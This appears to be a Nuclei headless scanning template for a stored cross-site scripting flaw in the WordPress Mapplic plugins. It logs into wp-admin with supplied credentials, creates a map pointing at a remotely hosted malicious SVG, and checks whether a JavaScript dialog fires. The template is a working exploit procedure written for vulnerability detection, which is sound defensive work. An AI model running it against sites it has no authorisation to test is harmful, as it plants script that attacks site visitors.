id: CVE-2012-10018

info:
  name: WordPress Mapplic <= 6.1 / Mapplic Lite <= 1.0 - Stored XSS via SVG URL Injection
  author: KrE80r
  severity: high
  description: |
    The Mapplic and Mapplic Lite plugins for WordPress are vulnerable to Stored Cross-Site Scripting via arbitrary URL injection in versions up to and including 6.1 and 1.0 respectively. Authenticated users with author-level permissions can inject arbitrary remote URLs for SVG map files. When a user views the map, the browser fetches the SVG via jQuery .load() and inserts it into the DOM, executing any embedded JavaScript.
  remediation: |
    Update Mapplic to version 7.0 or later, and Mapplic Lite to version 1.0.1 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2012-10018
    - https://wpscan.com/vulnerability/7bdee32b-9036-4e13-9586-4d6a9a1159c6/
    - https://packetstormsecurity.com/files/161920/WordPress-Mapplic-6.1-SSRF-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2012-10018
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    vendor: mapplic
    product: mapplic
  tags: cve,cve2012,wordpress,wp-plugin,xss,mapplic,authenticated,headless

variables:
  xss_svg: "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/helpers/payloads/CVE-2012-10018.svg"

headless:
  - steps:
      - args:
          url: "{{BaseURL}}/wp-login.php"
        action: navigate

      - action: waitload

      - args:
          by: x
          xpath: //input[@id='user_login']
        action: click

      - args:
          by: x
          value: "{{username}}"
          xpath: //input[@id='user_login']
        action: text

      - args:
          by: x
          xpath: //input[@id='user_pass']
        action: click

      - args:
          by: x
          value: "{{password}}"
          xpath: //input[@id='user_pass']
        action: text

      - args:
          by: x
          xpath: //input[@id='wp-submit']
        action: click

      - action: waitload

      - args:
          url: "{{BaseURL}}/wp-admin/post-new.php?post_type=mapplic_map"
        action: navigate

      - action: waitload

      - args:
          by: x
          xpath: //input[@id='title']
        action: click

      - args:
          by: x
          value: "XSS-Test-{{rand_text_alpha(6)}}"
          xpath: //input[@id='title']
        action: text

      - args:
          by: x
          xpath: //input[@name='new-map']
        action: click

      - args:
          by: x
          value: "{{xss_svg}}"
          xpath: //input[@name='new-map']
        action: text

      - args:
          by: x
          xpath: //input[@name='new-mapwidth']
        action: click

      - args:
          by: x
          value: "100"
          xpath: //input[@name='new-mapwidth']
        action: text

      - args:
          by: x
          xpath: //input[@name='new-mapheight']
        action: click

      - args:
          by: x
          value: "100"
          xpath: //input[@name='new-mapheight']
        action: text

      - args:
          by: x
          xpath: //input[@id='publish']
        action: click

      - action: waitdialog
        name: xss_triggered

    matchers:
      - type: dsl
        dsl:
          - xss_triggered == true
